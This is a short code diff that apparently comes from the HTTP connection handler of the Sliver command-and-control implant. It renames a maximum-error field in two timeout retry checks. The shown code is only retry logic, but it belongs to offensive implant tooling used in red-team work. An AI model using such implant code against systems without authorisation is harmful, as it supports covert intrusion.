@@ -117,7 +117,7 @@ func handleConnectionHTTP(c2 *sliverpb.Malleable, client *SliverHTTPClient, conn
 						// {{if .Config.Debug}}
 						log.Printf("timeout error #%d", errCount)
 						// {{end}}
-						if errCount < int(c2.MaxConnectionErrors) {
+						if errCount < int(c2.MaxErrors) {
 							continue
 						}
 					}
@@ -128,7 +128,7 @@ func handleConnectionHTTP(c2 *sliverpb.Malleable, client *SliverHTTPClient, conn
 						// {{if .Config.Debug}}
 						log.Printf("timeout error #%d", errCount)
 						// {{end}}
-						if errCount < int(c2.MaxConnectionErrors) {
+						if errCount < int(c2.MaxErrors) {
 							continue
 						}
 					}
